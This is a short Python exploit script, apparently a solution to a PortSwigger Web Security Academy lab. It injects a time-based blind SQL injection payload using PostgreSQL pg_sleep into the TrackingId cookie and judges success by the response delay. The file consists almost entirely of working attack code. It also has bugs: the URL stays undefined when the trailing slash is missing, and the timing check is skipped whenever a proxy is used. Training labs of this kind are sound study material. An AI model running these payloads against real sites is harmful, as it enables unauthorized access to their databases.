#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""SQL Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" 
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url
else: 
    print("(-) Add / to the end of URL")
s = requests.Session()

def sqli(url):
    r = s.get(url, verify=False)
    cookies = r.cookies.get_dict()
    tr_id = cookies['TrackingId']
    session = cookies['session']
    cmd = "'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--"
    tr_id_var = "TrackingId=" + tr_id + cmd + ";"
    session_var = " session=" + session
    headers = {
        'Cookie': tr_id_var + session_var,
        'Referer': 'https://portswigger.net/'
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        r = s.get(url, headers=headers, verify=False, proxies=proxies)
    else: 
        r = s.get(url, headers=headers, verify=False)
        if (r.elapsed.total_seconds() >= 10):
            print("(+) SQL Injection Successful!")
            subprocess.call(["firefox", url])
        else: 
            pass

def main():
    
    print("(+) Exploiting SQL Injection")
        
    sqli(url)

if __name__ == "__main__":
    main()
